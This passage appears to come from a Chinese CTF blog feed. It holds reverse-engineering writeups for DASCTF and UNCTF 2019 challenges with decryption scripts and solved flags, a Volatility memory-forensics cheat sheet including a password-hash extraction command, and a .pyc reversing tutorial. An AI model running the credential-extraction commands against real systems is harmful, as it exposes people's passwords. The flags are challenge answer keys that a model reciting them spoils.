class="hljs-string">&quot;NO&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>解密完成后我们便可以得到<code>XTEA</code>加密后的数据部分：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x1cd14c3b</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>ae<span class="hljs-number">1267</span>c,<span class="hljs-number">0</span>x<span class="hljs-number">91</span>edd<span class="hljs-number">1</span>f<span class="hljs-number">5</span>,<span class="hljs-number">0</span>xbf<span class="hljs-number">9</span>c<span class="hljs-number">950</span>,<span class="hljs-number">0</span>xe<span class="hljs-number">060</span>adf<span class="hljs-number">9</span>,<span class="hljs-number">0</span>xf<span class="hljs-number">88722</span>cd,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>b<span class="hljs-number">741595</span>,<span class="hljs-number">0</span>x<span class="hljs-number">54</span>bb<span class="hljs-number">88</span>b<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>接下来我们观察对应的<code>XTEA</code>加密部分，可以看出程序魔改了对应的<code>delta</code>，我们也不难写出对应的解密脚本</p><p><img src="https://s2.loli.net/2022/07/29/ENvU3SGLCcItQDM.png" alt="2.png"></p><p>最后我们将<code>XTEA</code>于字符串转换解密可以写出如下脚本：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> uint32_t unsigned int</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decipher</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> num_rounds, <span class="hljs-keyword">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-keyword">uint32_t</span> key[<span class="hljs-number">4</span>])</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x21524B01</span>, sum = <span class="hljs-number">0</span> - delta * num_rounds;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br>v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>sum += delta;<br>v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>&#125;<br>v[<span class="hljs-number">0</span>] = v0;<br>v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">uint32_t</span> key[] = &#123;<span class="hljs-number">0x21728857</span>, <span class="hljs-number">0xb5077292</span>, <span class="hljs-number">0xe737dc2b</span>, <span class="hljs-number">0x4cc17426</span>&#125;;<br><span class="hljs-keyword">uint32_t</span> enc[] = &#123;<span class="hljs-number">0x1cd14c3b</span>,<span class="hljs-number">0x8ae1267c</span>,<span class="hljs-number">0x91edd1f5</span>,<span class="hljs-number">0xbf9c950</span>,<span class="hljs-number">0xe060adf9</span>,<span class="hljs-number">0xf88722cd</span>,<span class="hljs-number">0x3b741595</span>,<span class="hljs-number">0x54bb88b5</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-built_in">decipher</span>(<span class="hljs-number">32</span>,enc,key);<br><span class="hljs-built_in">decipher</span>(<span class="hljs-number">32</span>,enc+<span class="hljs-number">2</span>,key);<br><span class="hljs-built_in">decipher</span>(<span class="hljs-number">32</span>,enc+<span class="hljs-number">4</span>,key);<br><span class="hljs-built_in">decipher</span>(<span class="hljs-number">32</span>,enc+<span class="hljs-number">6</span>,key);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)enc)[i] = (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)enc)[i] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span> | (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)enc)[i] &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>;<br>&#125;<br>cout&lt;&lt;(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)enc&lt;&lt;endl;<br>&#125;<br><span class="hljs-comment">//9592937429baca2948ffdb1442e39eb6</span><br><span class="hljs-comment">//DASCTF&#123;9592937429baca2948ffdb1442e39eb6&#125;</span><br></code></pre></td></tr></table></figure><p>因此我们可以得到<code>flag</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DASCTF</span>&#123;<span class="hljs-number">9592937429</span>baca<span class="hljs-number">2948</span>ffdb<span class="hljs-number">1442</span>e<span class="hljs-number">39</span>eb<span class="hljs-number">6</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>UNCTF - 2019 EasyVm</title>
    <link href="/2022/07/22/UNCTF%20-%202019%20EasyVm/"/>
    <url>/2022/07/22/UNCTF%20-%202019%20EasyVm/</url>
    
    <content type="html"><![CDATA[<p>整体而言是一个比较好分析的一个<code>VM</code>题目，对得起其<code>easy</code>的名字？</p><p>拖入<code>IDA</code>进行反编译，可以清楚的发现对应的结构特点</p><p><img src="https://s2.loli.net/2022/07/22/SMkB9cGvXgazN1w.png" alt="1.png"></p><p>我们跟进到创建栈空间的函数可发现其对应的操作函数集合</p><p><img src="https://s2.loli.net/2022/07/22/ZodHytJbeihs9an.png" alt="2.png"></p><p>我们可以发现里面的运算，可以进行简单的标注一下。</p><p>我们在这个函数的集合中可以发现第一个<code>run_vm</code>中存在有<code>switch - case</code>结构，因此可以推断出来这个函数就是在执行对应的操作指令判断，来进行执行后面的函数</p><p>进行简单的一下调试我们可以观察到其栈空间的分配规律：</p><p><img src="https://s2.loli.net/2022/07/22/4dWEDFtwxbnkm7r.png" alt="4.png"></p><p>同时我们可以注意到<code>operate</code>函数下方的<code>opcode</code>并没有按顺序进行执行，而是先跳到了<code>opcede+9</code>处的指令</p><p><img src="https://s2.loli.net/2022/07/22/8IwKhPENujtgo4W.png" alt="3.png"></p><p>简单的调试，我们可以获取到其对应的执行流程以及对应的指令操作的代表功能</p><p>对应指令翻译：</p><table><thead><tr><th style="text-align:center">操作码</th><th style="text-align:center">对应指令集合</th></tr></thead><tbody><tr><td style="text-align:center">*(a1+16)</td><td style="text-align:center">寄存器r1(占1字节)</td></tr><tr><td style="text-align:center">*(a1+17)</td><td style="text-align:center">寄存器r2(占1字节)</td></tr><tr><td style="text-align:center">*(a1+18)</td><td style="text-align:center">寄存器r3(占1字节)</td></tr><tr><td style="text-align:center">*(a1+19)</td><td style="text-align:center">寄存器r4(占1字节)</td></tr><tr><td style="text-align:center">*(a1+20)</td><td style="text-align:center">寄存器r5(占4字节)</td></tr><tr><td style="text-align:center">0xA0</td><td style="text-align:center">r1++</td></tr><tr><td style="text-align:center">0xA1</td><td style="text-align:center">r2++</td></tr><tr><td style="text-align:center">0xA2</td><td style="text-align:center">r3++</td></tr><tr><td style="text-align:center">0xA3</td><td style="text-align:center">r1 -= r3</td></tr><tr><td style="text-align:center">0xA4</td><td style="text-align:center">r1 ^= r2</td></tr><tr><td style="text-align:center">0xA5</td><td style="text-align:center">r2 ^= r1</td></tr><tr><td style="text-align:center">0xA6</td><td style="text-align:center">r1 = 0xCD</td></tr><tr><td style="text-align:center">0xA7</td><td style="text-align:center">r2 = r1</td></tr><tr><td style="text-align:center">0xA8</td><td style="text-align:center">r3 = 0xCD</td></tr><tr><td style="text-align:center">0xA9</td><td style="text-align:center">r1 = input[r3]</td></tr><tr><td style="text-align:center">0xAA</td><td style="text-align:center">r2 = input[r3]</td></tr><tr><td style="text-align:center">0xAB</td><td style="text-align:center">func1()</td></tr><tr><td style="text-align:center">0xAC</td><td style="text-align:center">func2()</td></tr><tr><td style="text-align:center">0xAD</td><td style="text-align:center">func3()</td></tr><tr><td style="text-align:center">0xAE</td><td style="text-align:center">判断r5的值</td></tr><tr><td style="text-align:center">0xAF</td><td style="text-align:center">判断r5的值</td></tr></tbody></table><p>可以得到程序对每个输入的字符进行的执行流程为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xa9</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">3</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">5</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">6</span>, <span class="hljs-number">0</span>xa<span class="hljs-number">4</span>, <span class="hljs-number">0</span>xab, <span class="hljs-number">0</span>xa<span class="hljs-number">7</span>, <span class="hljs-number">0</span>xae, <span class="hljs-number">0</span>xa<span class="hljs-number">2</span>, <span class="hljs-number">0</span>xad, <span class="hljs-number">0</span>xaf<br></code></pre></td></tr></table></figure><p>因此我们可以写出对应的翻译脚本与解密脚本进行解密：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 翻译脚本</span><br><span class="hljs-comment"># opcode = [0xa9, 0xa3, 0xa5, 0xa6, 0xa4, 0xab, 0xa7, 0xae, 0xa2, 0xad, 0xaf]</span><br><br><span class="hljs-comment"># for i in opcode:</span><br><span class="hljs-comment">#     if i == 0xa0:</span><br><span class="hljs-comment">#         print(&quot;r1++&quot;)</span><br><span class="hljs-comment">#     if i == 0xa1:</span><br><span class="hljs-comment">#         print(&quot;r2++&quot;)</span><br><span class="hljs-comment">#     if i == 0xa2:</span><br><span class="hljs-comment">#         print(&quot;r3++&quot;)</span><br><span class="hljs-comment">#     if i == 0xa3:</span><br><span class="hljs-comment">#         print(&quot;r1 -= r3&quot;)</span><br><span class="hljs-comment">#     if i == 0xa4:</span><br><span class="hljs-comment">#         print(&quot;r1 ^= r2&quot;)</span><br><span class="hljs-comment">#     if i == 0xa5:</span><br><span class="hljs-comment">#         print(&quot;r2 ^= r1&quot;)</span><br><span class="hljs-comment">#     if i == 0xa6:</span><br><span class="hljs-comment">#         print(&quot;r1 = 0xcd&quot;)</span><br><span class="hljs-comment">#     if i == 0xa7:</span><br><span class="hljs-comment">#         print(&quot;r2 = r1&quot;)</span><br><span class="hljs-comment">#     if i == 0xa8:</span><br><span class="hljs-comment">#         print(&quot;r3 = 0xcd&quot;)</span><br><span class="hljs-comment">#     if i == 0xa9:</span><br><span class="hljs-comment">#         print(&quot;r1 = input[r3]&quot;)</span><br><span class="hljs-comment">#     if i == 0xaa:</span><br><span class="hljs-comment">#         print(&quot;r2 = input[r3]&quot;)</span><br><span class="hljs-comment">#     if i == 0xab:</span><br><span class="hljs-comment">#         print(&quot;fun1()&quot;)</span><br><span class="hljs-comment">#     if i == 0xac:</span><br><span class="hljs-comment">#         print(&quot;func2()&quot;)</span><br><span class="hljs-comment">#     if i == 0xad:</span><br><span class="hljs-comment">#         print(&quot;func3()&quot;)</span><br><span class="hljs-comment">#     if i == 0xae:</span><br><span class="hljs-comment">#         print(&quot;if(r5==0)&quot;)</span><br><span class="hljs-comment">#     if i == 0xaf:</span><br><span class="hljs-comment">#         print(&quot;if(r5!=1)&quot;)</span><br><br><span class="hljs-comment"># 翻译结果</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">r1 = input[r3] </span><br><span class="hljs-string">r1 -= r3</span><br><span class="hljs-string">r2 ^= r1</span><br><span class="hljs-string">r1 = 0xcd</span><br><span class="hljs-string">r1 ^= r2</span><br><span class="hljs-string">fun1()</span><br><span class="hljs-string">r2 = r1</span><br><span class="hljs-string">if(r5!=0)</span><br><span class="hljs-string">r3++</span><br><span class="hljs-string">func3()</span><br><span class="hljs-string">if(r5!=1)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 解密脚本</span><br>res = [<span class="hljs-number">0xF4</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x7C</span>]<br>flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">32</span><br>temp = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):<br>    flag[i] = (temp ^ res[i] ^ <span class="hljs-number">0xcd</span>) + i<br>    temp = res[i]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UNCTF&#123;&quot;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>因此我们可以得到<code>flag</code>为：<code>UNCTF&#123;942a4115be2359ffd675fa6338ba23b6&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Volatility 取证总结</title>
    <link href="/2022/07/19/Volatility%20%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/"/>
    <url>/2022/07/19/Volatility%20%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>近期才打完蓝帽杯，发现基本上自己除了取证啥也不会，完完全全成了取证大赛…于是计划总结一下比赛过程中所用到的<code>volatility</code>取证有关的知识点</p><h2 id="有关命令">有关命令</h2><p>命令格式：<code>volatility -f [文件名] --profile=[dump的系统版本] [命令]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">volatility -f [文件名] imageinfo <span class="hljs-comment">#检测目标系统信息</span><br><br>volatility -f [文件名] imageinfo <span class="hljs-comment">#获取dump的版本</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] pslist <span class="hljs-comment">#查看运行的进程信息</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] psscan <span class="hljs-comment">#获取一些隐藏文件进程信息</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] filescan <span class="hljs-comment">#扫描内存中的文件</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] hivelist <span class="hljs-comment">#列举缓存在内存中的注册表</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] printkey -K <span class="hljs-string">&quot;SAM\Domains\Account\Users\Names&quot;</span> <span class="hljs-comment">#查看系统用户名</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] filescan  <span class="hljs-comment">#查看文件列表</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] dumpfile -Q 0x000007 -D dir <span class="hljs-comment">#下载感兴趣的文件，#dir你保存的路径</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] procdump -Q 0x000007 -D dir<br><br>volatility -f [文件名] --profile=[dump的系统版本] hashdump <span class="hljs-comment">#提取系统的账号密码</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] netscan | grep ESTABLISHED <span class="hljs-comment">#查看网络通信连接</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] cmdscan <span class="hljs-comment">#查看cmd历史记录</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] memdump -p 352 -D dir ./ <span class="hljs-comment">#导出nc进程传输的文件，352为nc的进程号 dir 为保存的路径</span><br><br>foremost 352.dmp <span class="hljs-comment">#分割dmp文件</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] filescan  <span class="hljs-comment">#查找镜像中的文件</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] userassist <span class="hljs-comment">#查看userassist键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] clipboard <span class="hljs-comment"># 获取剪切板中的数据</span><br><br>volatility -f [文件名] --profile=[dump的系统版本] hivelist <span class="hljs-comment"># 获取注册表信息</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python逆向</title>
    <link href="/2022/07/13/Python%E9%80%86%E5%90%91/"/>
    <url>/2022/07/13/Python%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>随着<code>CTF</code>的兴起，有着越来越多样化的逆向题目(<s>各种不会的语言被出出来折磨人</s>)，我们可以比较常见的是<code>C</code>、<code>C++</code>语言的逆向题目，而<code>Python</code>题目出现也算是较为常见，题目多为<code>pyc</code>或者是<code>exe</code>，今天与大家一起分享一下关于<code>Python</code>逆向的一些东西</p><h1>前言</h1><p>随着当下CTF比赛的发展，各种各样的语音逆向逐渐产生，如C、C++、Python等一些常见语言用于出题也是常规题型，而我们此次所初步了解的是Python的语言逆向，文章整体讲解的较为简单，主要涉及到<code>.py</code> /<code>.pyc</code>/<code>.exe（python打包后的程序）</code>三类题型，如有不足还请多多指正。</p><h2 id="py">.py</h2><p>在这个情况下我们直接拿到了对应的源代码，可以直接通过对源码进行分析，写出对应的逆向算法进行求解</p><p>比如我们现在有如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">a</span>):</span><br>    <span class="hljs-keyword">if</span> a == <span class="hljs-number">123</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Yes!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO!&quot;</span>)<br>        <br>        <br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入对应flag：&quot;</span>)<br>check(<span class="hljs-built_in">int</span>(a))<br></code></pre></td></tr></table></figure><p>我们可以直接观察到程序的源代码，需要我们输入一个<code>flag</code>进行保存在<code>a</code>中，之后便会对<code>a</code>和<code>123</code>进行比较，如果相同，那么将会输出<code>Yes!</code>如果输入错误那就会输出<code>NO!</code>，我们可以很直观的观察到程序的逻辑，因此我们只需要对程序的加密过程进行求解，像此题中的比较，进行逆向思维求解即可</p><h2 id="pyc">.pyc</h2><h3 id="参考资料">参考资料</h3><blockquote><p>PYC文件是什么</p><p><a href="https://www.jianshu.com/p/a2e3ef5b9546">https://www.jianshu.com/p/a2e3ef5b9546</a></p><p>PYC文件结构</p><p><a href="https://blog.csdn.net/weixin_35967330/article/details/114390031">https://blog.csdn.net/weixin_35967330/article/details/114390031</a></p></blockquote><h3 id="如何生成pyc">如何生成pyc</h3><blockquote><p>python -m <a href="http://code.py">code.py</a></p></blockquote><p>生成的<code>pyc</code>文件是可以运行的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code.pyc<br></code></pre></td></tr></table></figure><p><code>.pyc</code>分成两种情况，一种是不带花指令的，另一种是带花指令的</p><h3 id="不带花指令">不带花指令</h3><p>对于不带花指令的<code>.pyc</code>文件，我们可以直接使用<code>uncompyle6</code>对其进行转换，可以直接得到对应的源代码<code>.py</code>文件</p><p>如下图：</p><p><img src="https://s2.loli.net/2022/05/22/7eH3g2CbGKkYlnr.png" alt=""></p><h3 id="带花指令">带花指令</h3><p>对于带花指令的<code>.pyc</code>文件我们如果直接使用<code>uncompyle6</code>对其进行转换会出现如下状况：</p><p><img src="https://s2.loli.net/2022/05/22/DCbWFe1sHVQiRcg.png" alt=""></p><p>会提示我们数组发生了越界，证明在这个<code>.pyc</code>文件中添加了一些花指令，让我们无法直接进行转换得到<code>.py</code>，那么应该怎么解决呢？</p><p>我们通过导入<code>dis</code>，<code>marshal</code>两个库来进行查看对应<code>pyc</code>的字节码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> dis,marshal<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;[对应pyc名字]&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>code = marshal.loads(f[<span class="hljs-number">8</span>:]) <span class="hljs-comment"># 前8个为pyc对应的魔数(好像py2是8，py3是16)</span><br><span class="hljs-comment"># 我们绕过对应魔数进行加载</span><br><span class="hljs-built_in">print</span>(dis.dis(code))<br></code></pre></td></tr></table></figure><p>通过上述步骤我们可以看到对应的<code>py</code>的字节码，我们可以看到如下图：</p><p><img src="https://s2.loli.net/2022/05/22/7fUYsdyAphHi2vB.png" alt=""></p><p>那么我们应该怎么进行反编译呢？答案是看对应的字节码，我们可以在<code>python库</code>里找到对应字节码的含义，对其进行翻译，找到对应的花在的地方，之后再到<code>010</code>中进行修改对应字节码的长度和去除对应字节码<code>(花指令的字节码)</code></p><p>在上图中我们可以看到有一个<code>LOAD_CONST 255</code>可以看到在此处发生了报错，在这个语句前一句有一个<code>JUMP_ABSOLUTE 18</code>，对于这条语句就已经强制跳转到<code>LOAD_CONST 255</code>下一条语句了，因此这个语句被判定为一个花，所以我们需要将其去除。</p><p>我们先使用<code>len(code.co_code)</code>来查看对应的<code>pyc</code>字节码长度，之后减去 3 <code>(Python3 好像不太一样)</code>，那么在哪里减呢？我们需要先找到对应的字节码的编号在对应的<code>opcode.h</code>中进行查找</p><p><img src="https://s2.loli.net/2022/05/22/Go14RNqvAs2FMrp.png" alt=""></p><p>查找到后我们在<code>010</code>中进行查找<code>0x71</code>同时比较后面的数字<code>18</code>的十六进制<code>0x12</code>，之后我们可以找到：</p><p><img src="https://s2.loli.net/2022/05/22/v29GHKWY4ATIsmL.png" alt=""></p><p>之后我们可以直接确定后面的<code>64 FF 00</code>这三个字节为对应的花位置，我们将这 6 个十六进制进行去除：</p><p><img src="https://s2.loli.net/2022/05/22/ty3wFHkUJoO975n.png" alt=""></p><p>我们将<code>0x1B</code>进行修改为<code>0x15</code>，同时将对应的 6 个字节进行删除，并再次保存为<code>.pyc</code>文件，之后使用<code>uncompyle6</code>进行反编译即可。</p><h2 id="txt-里面写有对应的-Python-字节码">txt 里面写有对应的 Python 字节码</h2><p>对于这种题目就只能看对应字节码进行还原，通过这样的方式手动还原为对应的<code>py</code>源代码，之后再进行对应的逆向工作。</p><p>如我们有源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">a</span>):</span><br>flag = <span class="hljs-string">&#x27;123&#x27;</span><br>    <span class="hljs-keyword">if</span> flag == a :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Yes!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO!&quot;</span>)<br>        <br>        <br>a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入对应flag：&quot;</span>)<br>check(a)<br></code></pre></td></tr></table></figure><p>我们通过<code>python</code>将其编译为<code>.pyc</code>文件后导入<code>dis</code>库进行反编译为字节码</p><blockquote><p>与之前转换<code>pyc</code>为字节码相同</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> dis,marshal<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;[对应pyc名字]&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>code = marshal.loads(f[<span class="hljs-number">8</span>:]) <span class="hljs-comment"># 前8个为pyc对应的魔数(py2是8，py3是16)</span><br><span class="hljs-comment"># 我们绕过对应魔数进行加载</span><br><span 